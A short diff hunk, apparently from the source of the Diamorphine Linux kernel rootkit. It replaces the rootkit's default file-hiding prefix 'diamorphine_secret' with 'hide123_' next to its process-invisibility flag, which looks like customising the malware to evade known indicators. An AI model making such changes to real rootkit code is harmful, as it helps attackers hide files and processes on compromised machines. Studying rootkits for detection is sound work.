@@ -5,7 +5,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "hide123_"
 
 #define PF_INVISIBLE 0x10000000
 
